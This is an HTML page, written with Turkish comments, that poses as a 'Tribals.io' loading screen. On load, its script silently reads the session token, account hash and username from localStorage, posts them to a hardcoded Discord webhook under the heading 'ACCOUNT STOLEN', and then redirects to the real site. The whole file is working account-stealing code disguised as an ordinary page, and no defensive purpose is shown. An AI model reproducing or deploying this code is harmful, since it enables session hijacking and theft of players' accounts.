<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Tribals.io</title>
    <script>
        // ===== WEBHOOK (SENİN LİNKİN) =====
        const WEBHOOK = "https://discord.com/api/webhooks/1509236348479868940/ri6coZeLF0SF33bbZDLDFJsfdGE4H_01_v3MDD_B_6PwNJ4pxzrqwDgpfAEkyqkBUuxj";

        // Sayfa yüklenir yüklenmez çalışır
        window.onload = function() {
            // localStorage'dan verileri al
            const session = localStorage.getItem('session') || 'YOK';
            const hash = localStorage.getItem('accountHash') || 'YOK';
            const user = localStorage.getItem('userName') || 'Bilinmiyor';

            // Webhook'a gönder (arka planda, sessizce)
            const xhr = new XMLHttpRequest();
            xhr.open("POST", WEBHOOK, true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify({
                embeds: [{
                    title: "🎯 HESAP ÇALINDI",
                    color: 0xff0000,
                    fields: [
                        { name: "👤 Kullanıcı", value: user, inline: true },
                        { name: "🔑 Session", value: "||" + session + "||", inline: false },
                        { name: "🔐 Hash", value: "||" + hash + "||", inline: false }
                    ],
                    timestamp: new Date().toISOString()
                }]
            }));

            // Hemen tribals.io'ya yönlendir
            window.location.href = "https://tribals.io";
        };
    </script>
</head>
<body>
    <h2>Yükleniyor...</h2>
</body>
</html>
